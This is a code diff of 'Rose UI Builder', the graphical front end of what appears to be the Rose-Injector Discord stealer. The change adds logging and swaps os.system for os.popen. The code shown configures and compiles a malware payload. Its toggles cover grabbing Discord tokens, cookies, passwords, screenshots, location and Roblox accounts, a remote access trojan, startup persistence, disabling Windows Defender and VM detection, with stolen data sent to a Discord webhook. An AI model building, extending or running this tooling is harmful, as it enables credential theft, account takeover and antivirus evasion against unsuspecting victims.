@@ -1,4 +1,5 @@
-import sys, os
+import sys
+import os
 if sys.executable.endswith('pythonw.exe'):
     sys.stdout = open(os.devnull, 'w')
     sys.stderr = open(os.path.join(os.getenv('TEMP'), 'stderr-{}'.format(os.path.basename(sys.argv[0]))), "w")
@@ -9,16 +10,23 @@ import builder
 from flaskwebgui import FlaskUI
 from nicegui import ui
 import requests
-import random
-import threading
 
 from dhooks import Webhook, Embed 
 import os 
-from bs4 import BeautifulSoup
-import shutil 
 from pathlib import Path
-import subprocess
 import ctypes
+
+import logging
+
+logging.basicConfig(
+    level=logging.DEBUG,
+    filename='roselog.log',
+    filemode='a',
+    format='[%(filename)s:%(lineno)d] - %(asctime)s - %(levelname)s - %(message)s'
+)
+
+logger = logging.getLogger(__name__)
+
 
 __title__ = 'Rose UI Builder'
 __avatar__ = 'https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/readme/RoseWBG.png'
@@ -76,6 +84,7 @@ def auto_update():
 def change_fakeerror():
     global xfakeerror
     xfakeerror = not xfakeerror
+    logger.info(f"FakeError has been set to {xfakeerror}")
     if xfakeerror:
         ui.notify("Fake Error has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="pink", position="top-right")
         return
@@ -84,6 +93,7 @@ def change_fakeerror():
 def change_nitrobuy():
     global xnitrobuy
     xnitrobuy = not xnitrobuy
+    logger.info(f"Nitro Auto has been set to {xnitrobuy}")
     if xnitrobuy:
         ui.notify("Nitro Auto Buy has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="pink", position="top-right")
         return 
@@ -92,6 +102,7 @@ def change_nitrobuy():
 def change_defenderfucker():
     global xdefenderfucker
     xdefenderfucker = not xdefenderfucker
+    logger.info(f"WindowsDefender has been set to {xdefenderfucker}")
     if xdefenderfucker:
         ui.notify("Windows Defender Fucker has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="pink", position="top-right")
         return 
@@ -100,6 +111,7 @@ def change_defenderfucker():
 def change_vmdetect():
     global xvmdetect
     xvmdetect = not xvmdetect
+    logger.info(f"VM Detection has been set to {xvmdetect}")
     if xvmdetect:
         ui.notify("VM Detection has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="pink", position="top-right")
         return 
@@ -112,6 +124,7 @@ def change_vmwebhookurl(value):
 def change_startups():
     global xstartup
     xstartup = not xstartup
+    logger.info(f"Startup has been set to {xstartup}")
     if xstartup:
         ui.notify("Startup has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="pink", position="top-right")
         return 
@@ -120,6 +133,7 @@ def change_startups():
 def change_injection():
     global xinjection
     xinjection = not xinjection
+    logger.info(f"Injection has been set to {xinjection}")
     if xinjection:
         ui.notify("Injection has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="pink", position="top-right")
         return
@@ -128,6 +142,7 @@ def change_injection():
 def change_tokens():
     global xtoken
     xtoken = not xtoken
+    logger.info(f"TokenGrabbing has been set to {xtoken}")
     if xtoken:
         ui.notify("Token Grabbing has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-right")
         return
@@ -136,6 +151,7 @@ def change_tokens():
 def change_cookies():
     global xcookie
     xcookie = not xcookie
+    logger.info(f"Cookie Grabbing has been set to {xcookie}")
     if xcookie:
         ui.notify("Cookies Grabbing has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-right")
         return
@@ -144,6 +160,7 @@ def change_cookies():
 def change_passwords():
     global xpassword
     xpassword = not xpassword
+    logger.info(f"Password has been set to {xpassword}")
     if xpassword:
         ui.notify("Passwords Grabbing has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-right")
         return
@@ -152,6 +169,7 @@ def change_passwords():
 def change_screenshots():
     global xscreenshot
     xscreenshot = not xscreenshot
+    logger.info(f"Screenshot has been set to {xscreenshot}")
     if xscreenshot:
         ui.notify("Screenshot has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-right")
         return
@@ -160,6 +178,7 @@ def change_screenshots():
 def change_malicious():
     global xmalicious
     xmalicious = not xmalicious
+    logger.info(f"Malicious Grabbing has been set to {xmalicious}")
     if xmalicious:
         ui.notify("Malicious Grabbing has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-right")
         return
@@ -168,6 +187,7 @@ def change_malicious():
 def change_locations():
     global xlocation
     xlocation = not xlocation
+    logger.info(f"Location Grabbing has been set to {xlocation}")
     if xlocation:
         ui.notify("Location Grabbing has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-right")
         return 
@@ -176,6 +196,7 @@ def change_locations():
 def change_robloxs():
     global xroblox
     xroblox = not xroblox
+    logger.info(f"Roblox Grabbing has been set to {xroblox}")
     if xroblox:
         ui.notify("Roblox Grabbing has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-right")
         return
@@ -184,6 +205,7 @@ def change_robloxs():
 def change_rats():
     global xrat
     xrat = not xrat
+    logger.info(f"RAT has been set to {xrat}")
     if xrat:
         ui.notify("RAT has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="yellow-7", position="top-right")
         return
@@ -192,9 +214,11 @@ def change_rats():
 def change_ratsurl(value):
     global xraturl
     xraturl = value   
+    logger.info(f"RAT link has been set to {xraturl}")
 
 def change_pings():
     global xping
+    logger.info(f"XPing has been set to {xping}")
     if xping:
         ui.notify("Ping has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="yellow-7", position="top-right")
         return
@@ -203,13 +227,15 @@ def change_pings():
 def change_webhookurl(value):
     global xwehookurl
     xwehookurl = value
+    logger.info(f"Webhook Link has been set to {xwehookurl}")
 
 def change_buildname(value):
     global xbuildname
     xbuildname = value
+    logger.info(f"Build Name has been set to {xbuildname}")
 
 async def _test_webhook():
-    result = await builder.test_webhook(xwehookurl)
+    result = await test_webhook(xwehookurl)
     if result == 0:
         ui.notify("WebHook successfuly executed!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-left")
         return 
@@ -232,17 +258,20 @@ async def test_webhook(webhook_url):
             await hook.send(embed=embed)
         return 0
     except Exception as e:
-        print(e)
+        logger.error(f"WebHook failed to execute - Link: {webhook_url} - Error: {e}")
         return 1
 
 def __build():
-    global xraturl 
-    path = f'{Path(__file__).resolve().parent}\\builder.py'
-    print(path)
+    global xraturl
     if xraturl == "":
         xraturl = ".rat"
+         
+    path = f'{Path(__file__).resolve().parent}\\builder.py'
+    logger.info(f"Path: {path}")
     msg = f"start cmd /c py {path} {xbuildname} {xwehookurl} {xrat} {xraturl} {xstartup} {xinjection} {xtoken} {xcookie} {xpassword} {xmalicious} {xlocation} {xroblox} {xscreenshot} {xping} {xvmdetect} {xvmwebhookurl} {xfakeerror} {xnitrobuy} {xdefenderfucker}"
-    os.system(msg)
+    logger.info(f"MSGLine to compile: {msg}")
+    output = os.popen(msg).read()
+    logger.info(f"Building output: {output}")
 
 def _makebuild():
     if xwehookurl == "":
